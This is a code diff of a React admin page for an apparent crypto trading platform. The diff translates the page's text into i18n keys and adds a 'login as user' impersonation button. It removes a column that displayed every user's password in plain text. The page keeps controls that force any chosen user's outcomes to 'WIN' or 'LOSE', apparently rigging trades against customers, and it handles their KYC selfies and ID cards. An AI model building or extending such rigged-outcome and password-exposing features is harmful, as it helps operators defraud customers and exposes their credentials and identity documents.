@@ -1,8 +1,12 @@
+//src>components>AdminUsers.jsx
+
 import React, { useEffect, useState, useRef } from "react";
-import { UserCircle2, BadgeCheck, XCircle, Loader2 } from "lucide-react";
+import { useTranslation } from "react-i18next";
+import { UserCircle2, BadgeCheck, XCircle, Loader2, Eye, ExternalLink, LogIn } from "lucide-react";
 import { API_BASE } from "../config";
 
-const MAIN_API_BASE = "https://novachain-backend.onrender.com";
+const MAIN_API_BASE = "https://novachain2-backend.onrender.com";
+const USER_FRONTEND_URL = "https://your-user-frontend.com"; // Replace with your user frontend URL
 
 // KYC image resolver (always uses main backend for /uploads)
 function resolveKYCUrl(raw) {
@@ -23,6 +27,7 @@ function formatDate(dt) {
 }
 
 export default function AdminUsers() {
+  const { t } = useTranslation();
   const [users, setUsers] = useState([]);
   const [loading, setLoading] = useState(true);
   const [actionLoading, setActionLoading] = useState(null);
@@ -75,24 +80,22 @@ export default function AdminUsers() {
     setLoading(false);
   };
 
-// Find and replace your current fetchWinModes with this:
-const fetchWinModes = async () => {
-  try {
-    const token = localStorage.getItem("adminToken");
-    const res = await fetch(`${API_BASE}/api/admin/user-win-modes`, {
-      headers: { Authorization: `Bearer ${token}` },
-    });
-    const data = await res.json();
-    // Convert array to object map
-    const modeMap = {};
-    (Array.isArray(data) ? data : []).forEach((u) => {
-      modeMap[u.id] = u.mode;
-    });
-    setUserWinModes(modeMap);
-  } catch {
-    setUserWinModes({});
-  }
-};
+  const fetchWinModes = async () => {
+    try {
+      const token = localStorage.getItem("adminToken");
+      const res = await fetch(`${API_BASE}/api/admin/user-win-modes`, {
+        headers: { Authorization: `Bearer ${token}` },
+      });
+      const data = await res.json();
+      const modeMap = {};
+      (Array.isArray(data) ? data : []).forEach((u) => {
+        modeMap[u.id] = u.mode;
+      });
+      setUserWinModes(modeMap);
+    } catch {
+      setUserWinModes({});
+    }
+  };
 
   // Set WIN/LOSE mode for user
   const setUserWinMode = async (user_id, mode) => {
@@ -107,7 +110,7 @@ const fetchWinModes = async () => {
       });
       await fetchWinModes();
     } catch (err) {
-      setError(err.message || "Failed to update win mode");
+      setError(err.message || t("users.updateError"));
     }
     setActionLoading(null);
   };
@@ -124,14 +127,14 @@ const fetchWinModes = async () => {
       });
       await fetchUsers();
     } catch (err) {
-      setError(err.message || "Failed to update KYC status");
+      setError(err.message || t("users.kycUpdateError"));
     }
     setActionLoading(null);
   };
 
   // Delete user
   const deleteUser = async (user_id) => {
-    if (!window.confirm("Are you sure you want to delete this user? This cannot be undone.")) return;
+    if (!window.confirm(t("users.deleteConfirm"))) return;
     setActionLoading(user_id + "-delete");
     setError("");
     try {
@@ -142,7 +145,46 @@ const fetchWinModes = async () => {
       });
       await fetchUsers();
     } catch (err) {
-      setError(err.message || "Failed to delete user");
+      setError(err.message || t("users.deleteError"));
+    }
+    setActionLoading(null);
+  };
+
+  // Login as user (Impersonation)
+  const loginAsUser = async (user) => {
+    setActionLoading(user.id + "-login");
+    try {
+      const token = localStorage.getItem("adminToken");
+      const response = await fetch(`${API_BASE}/api/admin/impersonate/${user.id}`, {
+        method: "POST",
+        headers: {
+          Authorization: `Bearer ${token}`,
+          "Content-Type": "application/json",
+        },
+      });
+
+      const data = await response.json();
+      if (!response.ok) throw new Error(data.message || "Failed to login as user");
+
+      // Store the user token for frontend access
+      localStorage.setItem("userToken", data.userToken);
+      localStorage.setItem("impersonatedUserId", user.id);
+      localStorage.setItem("impersonatedUserEmail", user.email);
+      
+      // Open user frontend in new tab
+      window.open(`${USER_FRONTEND_URL}?impersonate=true`, "_blank");
+      
+      // Show success message
+      setError("");
+      // Optional: Show temporary success message
+      const successMsg = document.createElement("div");
+      successMsg.className = "fixed bottom-4 right-4 bg-green-500 text-white p-3 rounded-lg shadow-lg z-50 animate-pulse";
+      successMsg.innerText = t("users.loginSuccess", { email: user.email });
+      document.body.appendChild(successMsg);
+      setTimeout(() => successMsg.remove(), 3000);
+      
+    } catch (err) {
+      setError(err.message || t("users.loginError"));
     }
     setActionLoading(null);
   };
@@ -163,14 +205,14 @@ const fetchWinModes = async () => {
     <div className="max-w-6xl mx-auto mt-10 px-2 sm:px-6 py-8 rounded-2xl shadow-2xl bg-gradient-to-br from-white/5 via-[#191e29]/80 to-[#181b25]/90 border border-white/5">
       <h2 className="flex items-center gap-2 text-2xl font-extrabold mb-6 tracking-tight text-[#ffd700]">
         <UserCircle2 size={24} className="text-[#16d79c]" />
-        All Users
+        {t("users.title")}
       </h2>
 
       {/* Search Box */}
       <div className="mb-4 flex items-center gap-2">
         <input
           type="text"
-          placeholder="Search by User ID"
+          placeholder={t("users.searchById")}
           className="px-4 py-2 rounded-xl border border-[#232836] bg-[#191e29] text-[#ffd700] font-semibold w-64 shadow"
           value={userIdSearch}
           onChange={e => setUserIdSearch(e.target.value)}
@@ -180,7 +222,7 @@ const fetchWinModes = async () => {
             className="ml-2 px-2 py-1 bg-[#f34e6d] text-white rounded-lg text-xs"
             onClick={() => setUserIdSearch("")}
           >
-            Clear
+            {t("common.clear")}
           </button>
         )}
       </div>
@@ -193,7 +235,7 @@ const fetchWinModes = async () => {
       {loading ? (
         <div className="flex justify-center items-center py-16">
           <Loader2 className="animate-spin text-[#FFD700] mr-2" size={30} />
-          <span className="text-yellow-200 font-bold">Loading users...</span>
+          <span className="text-yellow-200 font-bold">{t("common.loading")}</span>
         </div>
       ) : (
         <>
@@ -207,28 +249,42 @@ const fetchWinModes = async () => {
             <table className="admin-table min-w-[1300px]">
               <thead>
                 <tr>
-                  <th>User ID</th>
-                  <th>Email</th>
-                  <th>Password</th>
-                  <th>Selfie</th>
-                  <th>ID Card</th>
-                  <th>KYC Status</th>
-                  <th>Sign Up Date</th>
-                  <th>Current Mode</th>
-                  <th>Actions</th>
+                  <th>{t("users.userId")}</th>
+                  <th>{t("users.email")}</th>
+                  <th>{t("users.loginAs")}</th>
+                  <th>{t("users.selfie")}</th>
+                  <th>{t("users.idCard")}</th>
+                  <th>{t("users.kycStatus")}</th>
+                  <th>{t("users.signUpDate")}</th>
+                  <th>{t("users.currentMode")}</th>
+                  <th>{t("common.actions")}</th>
                 </tr>
               </thead>
               <tbody>
                 {filteredUsers.length === 0 ? (
                   <tr>
-                    <td colSpan={9}>No users found.</td>
+                    <td colSpan={9}>{t("users.noUsers")}.</td>
                   </tr>
                 ) : (
                   filteredUsers.map((user) => (
                     <tr key={user.id}>
-                      <td>{user.id}</td>
-                      <td>{user.email}</td>
-                      <td>{user.password}</td>
+                      <td className="font-mono font-bold">#{user.id}</td>
+                      <td className="text-[#16d79c] font-medium">{user.email}</td>
+                      {/* Login As User Button */}
+                      <td>
+                        <button
+                          onClick={() => loginAsUser(user)}
+                          disabled={actionLoading === user.id + "-login"}
+                          className="px-3 py-1.5 bg-gradient-to-r from-[#16d79c] to-[#ffd700] rounded-lg text-xs font-bold text-[#181b25] shadow hover:shadow-lg transition-all flex items-center gap-1 hover:scale-105 whitespace-nowrap"
+                        >
+                          {actionLoading === user.id + "-login" ? (
+                            <Loader2 className="animate-spin" size={14} />
+                          ) : (
+                            <LogIn size={14} />
+                          )}
+                          {actionLoading === user.id + "-login" ? t("common.loggingIn") : t("users.loginAs")}
+                        </button>
+                      </td>
                       {/* Selfie */}
                       <td>
                         {user.kyc_selfie ? (
@@ -248,7 +304,7 @@ const fetchWinModes = async () => {
                             onError={e => { e.target.style.display = "none"; }}
                           />
                         ) : (
-                          <span className="text-gray-400 text-xs">N/A</span>
+                          <span className="text-gray-400 text-xs">{t("common.na")}</span>
                         )}
                       </td>
                       {/* ID Card */}
@@ -270,25 +326,25 @@ const fetchWinModes = async () => {
                             onError={e => { e.target.style.display = "none"; }}
                           />
                         ) : (
-                          <span className="text-gray-400 text-xs">N/A</span>
+                          <span className="text-gray-400 text-xs">{t("common.na")}</span>
                         )}
                       </td>
                       {/* KYC Status */}
                       <td>
                         {user.kyc_status === "approved" && (
                           <span className="flex items-center gap-1 text-green-400 font-bold">
-                            <BadgeCheck size={14} /> Approved
+                            <BadgeCheck size={14} /> {t("kyc.approved")}
                           </span>
                         )}
                         {user.kyc_status === "rejected" && (
                           <span className="flex items-center gap-1 text-red-400 font-bold">
-                            <XCircle size={14} /> Rejected
+                            <XCircle size={14} /> {t("kyc.rejected")}
                           </span>
                         )}
                         {user.kyc_status === "pending" && (
                           <>
                             <span className="flex items-center gap-1 text-yellow-400 font-bold">
-                              Pending
+                              {t("kyc.pending")}
                             </span>
                             {user.kyc_selfie && user.kyc_id_card && (
                               <div className="flex gap-2 mt-2">
@@ -300,14 +356,14 @@ const fetchWinModes = async () => {
                                   {actionLoading === user.id + "-kyc"
                                     ? <Loader2 className="animate-spin" size={15} />
                                     : <BadgeCheck size={15} />}
-                                  Approve
+                                  {t("kyc.approve")}
                                 </button>
                                 <button
                                   onClick={() => handleKYCStatus(user.id, "rejected")}
                                   disabled={actionLoading === user.id + "-kyc"}
                                   className="px-2 py-1 bg-gradient-to-r from-[#f34e6d] to-[#ffd700] text-[#181b25] rounded-lg font-bold shadow hover:opacity-90 transition flex items-center gap-1 text-xs"
                                 >
-                                  <XCircle size={15} /> Reject
+                                  <XCircle size={15} /> {t("kyc.reject")}
                                 </button>
                               </div>
                             )}
@@ -315,18 +371,18 @@ const fetchWinModes = async () => {
                         )}
                       </td>
                       {/* Sign Up Date */}
-                      <td>{formatDate(user.created_at)}</td>
+                      <td className="text-sm">{formatDate(user.created_at)}</td>
                       {/* Current Mode */}
                       <td>
                         <div className="flex flex-col gap-1">
                           {userWinModes[user.id] === "WIN" && (
-                            <span className="px-2 py-1 rounded-lg bg-green-800 text-green-300 font-bold text-xs shadow mb-1">WIN</span>
+                            <span className="px-2 py-1 rounded-lg bg-green-800 text-green-300 font-bold text-xs shadow mb-1">{t("users.win")}</span>
                           )}
                           {userWinModes[user.id] === "LOSE" && (
-                            <span className="px-2 py-1 rounded-lg bg-red-900 text-red-300 font-bold text-xs shadow mb-1">LOSE</span>
+                            <span className="px-2 py-1 rounded-lg bg-red-900 text-red-300 font-bold text-xs shadow mb-1">{t("users.lose")}</span>
                           )}
                           {!userWinModes[user.id] && (
-                            <span className="px-2 py-1 rounded-lg bg-gray-800 text-gray-400 font-semibold text-xs shadow mb-1">DEFAULT</span>
+                            <span className="px-2 py-1 rounded-lg bg-gray-800 text-gray-400 font-semibold text-xs shadow mb-1">{t("users.default")}</span>
                           )}
                           <div className="flex gap-1 mt-1">
                             <button
@@ -339,7 +395,7 @@ const fetchWinModes = async () => {
                               disabled={actionLoading === user.id + "-winmode"}
                             >
                               {userWinModes[user.id] === "WIN" ? <BadgeCheck size={14} /> : null}
-                              {userWinModes[user.id] === "WIN" ? "Auto Win" : "Set Win"}
+                              {userWinModes[user.id] === "WIN" ? t("users.autoWin") : t("users.setWin")}
                             </button>
                             <button
                               onClick={() => setUserWinMode(user.id, userWinModes[user.id] === "LOSE" ? null : "LOSE")}
@@ -351,7 +407,7 @@ const fetchWinModes = async () => {
                               disabled={actionLoading === user.id + "-winmode"}
                             >
                               {userWinModes[user.id] === "LOSE" ? <XCircle size={14} /> : null}
-                              {userWinModes[user.id] === "LOSE" ? "Auto Lose" : "Set Lose"}
+                              {userWinModes[user.id] === "LOSE" ? t("users.autoLose") : t("users.setLose")}
                             </button>
                           </div>
                         </div>
@@ -367,7 +423,7 @@ const fetchWinModes = async () => {
                           {actionLoading === user.id + "-delete" ? (
                             <Loader2 className="animate-spin" size={14} />
                           ) : (
-                            "Delete"
+                            t("common.delete")
                           )}
                         </button>
                       </td>
